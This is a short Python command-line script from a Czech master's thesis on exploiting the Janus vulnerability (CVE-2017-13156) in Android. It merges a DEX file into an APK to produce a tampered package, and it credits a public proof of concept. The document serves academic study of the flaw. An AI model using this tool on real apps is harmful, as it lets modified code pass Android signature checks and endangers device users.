# Tento kod je soucast diplomove prace "Vyuziti zranitelnosti Janus na operacnim systemu Android"
# Autor: Bc. Vit Soucek (soucevi1@fit.cvut.cz)
#
# Pouzite zdroje:
#     - Proof-of-concept vyuziti zranitelnosti Janus:
#         autor: V-E-O
#         dostupne z: https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156
#         Prevzata hlavni myslenka a postup tohoto zdroje. Zdroj neni citovan na konkretnich mistech v kodu,
#         nebot temer cely kod byl pro potreby teto prace upraven a prepsan


import click
from apk import Apk
from dex import Dex
from janus import Janus


@click.command()
@click.argument('in_dex', required=True, type=click.File('rb'))
@click.argument('in_apk', required=True, type=click.File('rb'))
@click.argument('out_apk', required=True, type=click.File('wb'))
def main(in_dex, in_apk, out_apk):
    print(f'Merging files {in_dex.name} and {in_apk.name}, result will be written to {out_apk.name}')

    dex_file = Dex(bytearray(in_dex.read()))
    apk_file = Apk(bytearray(in_apk.read()))

    merger = Janus(apk_file, dex_file)
    merger.update_offsets()
    out_data = merger.join_the_files()

    out_apk.write(out_data)

    print(f'{out_apk.name} generated')


if __name__ == '__main__':
    main()
